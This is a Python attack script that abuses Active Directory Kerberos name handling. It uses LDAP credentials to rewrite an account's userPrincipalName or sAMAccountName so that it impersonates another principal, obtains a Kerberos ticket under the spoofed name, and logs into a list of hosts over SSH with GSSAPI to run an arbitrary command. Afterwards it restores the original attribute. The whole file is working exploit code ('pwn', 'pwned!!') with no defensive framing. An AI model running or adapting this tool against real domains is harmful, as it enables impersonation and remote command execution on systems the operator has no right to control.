#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import logging
import paramiko
import os
import argparse

from pathlib import Path

from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.krb5.kerberosv5 import KerberosError
from impacket.krb5.ccache import CCache
from impacket.examples.logger import ImpacketFormatter
from impacket import version

from ldap3 import Server, Connection, ALL, NTLM, MODIFY_REPLACE

logger = logging.getLogger()
logger.setLevel(logging.INFO)
handler = logging.StreamHandler(sys.stderr)
handler.setFormatter(ImpacketFormatter())
logging.getLogger().addHandler(handler)
logging.getLogger().setLevel(logging.INFO)

def to_krb5_conf(domain: str, kdc_host: str) -> str:
    conf = Path("krb5.conf")
    data = f"""
[libdefaults]
    default_realm = {domain.upper()}
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    {domain.upper()} = {{
        kdc = {kdc_host.lower()}
        admin_server = {kdc_host.lower()}
        default_domain = {domain.lower()}
    }}

[domain_realm]
    .{domain.lower()} = {domain.upper()}
    {domain.lower()} = {domain.upper()}
"""
    conf.write_text(data.strip())
    return str(conf.resolve())


def save_tgt(ticket, filename, osk, sk):
    ccache = CCache()
    ccache.fromTGT(ticket, osk, sk)
    ccache.saveFile(filename)


def get_tgt_upn(upn: str, domain: str, password: str, kdc_host: str) -> str:
    if "@" in upn:
        user, realm = upn.split("@", 1)
        upn = f"{user}\\@{realm}"
    principal = Principal(
        value=upn,
        type=constants.PrincipalNameType.NT_ENTERPRISE.value
    )
    try:
        tgt, cipher, old_session_key, session_key = getKerberosTGT(
            clientName=principal,
            password=password,
            domain=domain,
            lmhash="",
            nthash="",
            kdcHost=kdc_host
        )
        cache = f"{upn}.ccache"
        save_tgt(ticket=tgt, filename=cache,
                 osk=old_session_key, sk=session_key)
        logger.info("saved TGT to %s", cache)
        return cache
    except KerberosError as e:
        logger.error("failed to get TGT for %s: %s", upn, e)
        return None


def spoof(domain: str,
          bind_user: str,
          bind_password: str,
          new_value,
          mode: str = "upn",
          ssl: bool = False,
          target_user: str = None) -> str:
    attr_map = {
        "upn": "userPrincipalName",
        "sam": "sAMAccountName",
    }
    if mode not in attr_map:
        logger.error("invalid mode %r", mode)
        return None
    attr = attr_map[mode]

    acct = target_user

    server = Server(domain, get_info=ALL, use_ssl=ssl)
    conn = Connection(
        server,
        user=f"{domain}\\{bind_user}",
        password=bind_password,
        authentication=NTLM
    )
    logger.info("LDAP Bind => %s\\%s @ %s",
                domain, bind_user, server.name)
    if not conn.bind():
        logger.error("bind failed: %s", conn.last_error)
        return None

    base_dn = server.info.other["defaultNamingContext"][0]
    conn.search(
        base_dn,
        f"(sAMAccountName={acct})",
        attributes=["distinguishedName", attr]
    )
    if not conn.entries:
        logger.error("account %s not found", acct)
        conn.unbind()
        return None

    entry = conn.entries[0]
    old = entry[attr].value or ""

    nv = new_value[0] if isinstance(new_value, list) else new_value
    if not nv:
        logger.error("no new value provided for %s", attr)
        conn.unbind()
        return None

    dn = entry.entry_dn
    conn.modify(dn, {attr: [(MODIFY_REPLACE, [nv])]})
    if conn.result["description"] != "success":
        logger.error("failed to modify %s: %s",
                     attr, conn.result["description"])
        conn.unbind()
        return None

    logger.info("OK: %s %s => %s", attr, old, nv)
    conn.unbind()
    return old


def pwn(host: str, user: str, cmd: str = ""):
    client = paramiko.SSHClient()
    # silence paramiko's debug logs
    paramiko_logger = logging.getLogger("paramiko")
    paramiko_logger.setLevel(logging.WARNING)
    paramiko_logger.propagate = False

    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=host,
            username=user,
            gss_auth=True,
            gss_kex=True,
            timeout=10.0,
        )
        logger.info("pwned!!")
        stdin, stdout, stderr = client.exec_command(cmd)
        print()
        print(stdout.read().strip().decode())
        print()
    except Exception as e:
        logger.error("%s", e)
    finally:
        client.close()
        logger.info("connection closed.")


def main():
    parser = argparse.ArgumentParser(
        description="[[domain/]user:pass@]target or [domain/]user:pass + -tf file"
    )
    parser.add_argument(
        'cred_target',
        metavar='CRED[@TARGET]',
        help='Either [[domain/]user:pass@]target '
             'OR [domain/]user:pass (with -tf)'
    )
    parser.add_argument(
        '-tf', '--target-file',
        dest='target_file',
        help='File with one target host per line'
    )
    parser.add_argument(
        '-dc', '--kdc-host',
        dest='kdc_host',
        required=False,
        help='KDC host'
    )
    parser.add_argument(
        '--upn',
        help='New UPN to set'
    )
    parser.add_argument(
        '--sam',
        help='New sAMAccountName to set'
    )
    parser.add_argument(
        '-tu', '--target-user',
        dest='target_user',
        help='Account whose UPN/SAM you can modify'
    )
    parser.add_argument(
        '-tp', '--target-password',
        dest='target_password',
        help='Password for the target account'
    )
    parser.add_argument(
        '--ssl',
        action='store_true',
        default=False,
        help='Use LDAPs'
    )
    parser.add_argument(
        '-x', '--execute',
        dest='cmd',
        required=True,
        help='Command to run on target'
    )

    args = parser.parse_args()

    # parse credentials vs. targets
    cred = args.cred_target
    if args.target_file:
        if '/' not in cred or ':' not in cred:
            logger.error("when using -tf, cred must be domain/user:pass")
            sys.exit(1)
        domain, rest = cred.split('/', 1)
        bind_user, bind_pass = rest.split(':', 1)
        with open(args.target_file, 'r') as f:
            targets = [l.strip() for l in f if l.strip()]
    else:
        try:
            cred_part, tgt = cred.rsplit('@', 1)
        except ValueError:
            logger.error("Invalid inline syntax: %s", cred)
            sys.exit(1)
        if '/' not in cred_part or ':' not in cred_part:
            logger.error("Invalid cred: %s", cred_part)
            sys.exit(1)
        domain, rest = cred_part.split('/', 1)
        bind_user, bind_pass = rest.split(':', 1)
        targets = [tgt]

    tgt_user = args.target_user
    tgt_pass = args.target_password 

    if not tgt_user or not tgt_pass:
        logger.error("you must specify --target-user and --target-password")
        sys.exit(1)

    if not args.upn and not args.sam:
        logger.error("you must specify either --upn or --sam")
        sys.exit(1)

    if not args.kdc_host:
        logger.critical("no KDC host specified, make sure you have a valid krb5.conf")
        logger.critical("continuing with default (/etc/krb5.conf)")

    logger.info(version.BANNER)
    if args.upn:
        old_upn = spoof(
            domain, bind_user, bind_pass,
            args.upn,
            mode="upn",
            ssl=args.ssl,
            target_user=tgt_user
        )
        if old_upn is None:
            sys.exit(1)

        cache = get_tgt_upn(args.upn, domain, tgt_pass, args.kdc_host)
        if not cache:
            sys.exit(1)
        os.environ["KRB5CCNAME"] = cache
        if args.kdc_host:
            os.environ["KRB5_CONFIG"] = to_krb5_conf(domain, args.kdc_host)

        for host in targets:
            logger.info("trying: %s", host)
            pwn(host=host, user=args.upn, cmd=args.cmd)
            print()

        spoof(
            domain, bind_user, bind_pass,
            old_upn,
            mode="upn",
            ssl=args.ssl,
            target_user=tgt_user
        )

    if args.sam:
        old_sam = spoof(
            domain, bind_user, bind_pass,
            args.sam,
            mode="sam",
            ssl=args.ssl,
            target_user=tgt_user
        )
        if old_sam is None:
            sys.exit(1)

        cache = get_tgt_upn(args.sam, domain, tgt_pass, args.kdc_host)
        if not cache:
            sys.exit(1)
        os.environ["KRB5CCNAME"] = cache
        if args.kdc_host:
            os.environ["KRB5_CONFIG"] = to_krb5_conf(domain, args.kdc_host)

        for host in targets:
            logger.info("trying: %s", host)
            pwn(host=host, user=args.sam, cmd=args.cmd)
            print()

        spoof(
            domain, bind_user, bind_pass,
            old_sam,
            mode="sam",
            ssl=args.ssl,
            target_user=args.sam
        )


if __name__ == "__main__":
    main()